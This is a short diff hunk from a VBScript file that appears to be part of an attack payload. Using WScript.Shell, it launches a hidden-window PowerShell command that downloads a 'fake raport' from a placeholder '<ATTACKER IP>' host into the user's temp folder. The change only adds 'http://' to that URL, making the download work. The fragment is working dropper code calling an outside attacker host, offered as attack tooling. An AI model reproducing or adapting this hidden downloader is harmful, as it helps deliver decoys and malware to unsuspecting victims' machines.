@@ -20,7 +20,7 @@ Set objShell = CreateObject("Wscript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake raport
-downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('<ATTACKER IP>/raport.txt', '%TEMP%\raport.txt')"""
+downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER IP>/raport.txt', '%TEMP%\raport.txt')"""
 objShell.Run downloadRaport, 0, True
 WScript.Sleep 1000  ' Wait for 1 second
 
